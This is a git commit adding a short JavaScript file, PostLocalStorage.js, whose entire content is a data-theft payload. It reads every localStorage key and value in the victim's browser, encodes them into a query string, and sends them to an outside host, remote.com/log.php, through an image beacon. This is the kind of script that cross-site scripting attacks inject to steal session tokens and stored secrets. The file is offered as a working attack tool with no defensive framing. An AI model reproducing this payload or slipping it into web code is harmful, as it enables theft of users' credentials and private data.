b81b0c4f4c170dd118c5ff464fb114c377f076c3
Harusenpai <30319832+Harusenpai@users.noreply.github.com>
2018-11-28 16:12:40 -0300

    Add files via upload

---
+++ PostLocalStorage.js
@@ -0,0 +1,10 @@
+if (window.localStorage) {
+    if (localStorage.length) {
+            var output;
+            for (var i = 0; i < localStorage.length; i++) {
+                    if(i>0) { output += "&"; }
+                    output += encodeURIComponent(localStorage.key(i)) + '=' + encodeURIComponent(localStorage.getItem(localStorage.key(i)));
+            }
+            new Image().src = 'http://remote.com/log.php?'+output;
+	}
+}
